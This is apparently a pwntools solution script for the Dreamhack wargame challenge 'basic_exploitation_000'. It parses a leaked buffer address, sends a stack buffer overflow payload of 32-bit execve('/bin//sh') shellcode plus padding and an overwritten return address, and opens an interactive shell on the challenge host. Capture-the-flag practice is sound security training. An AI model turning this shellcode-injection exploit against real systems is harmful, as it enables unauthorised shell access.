from pwn import *

p = remote("host1.dreamhack.games", 11548)
#p = process("./basic_exploitation_000")

context.log_level = 'debug'
#gdb.attach(p)

tmp = p.recvuntil('\n')
print(tmp[7:-2])
ret_address = int(tmp[7:-2],16)

buf2ret = 132

#code = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
code = b"\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x08\x40\x40\x40\xcd\x80"
code += b"\x80"*(buf2ret-len(code))
code += p32(ret_address)

p.send(code)
p.interactive()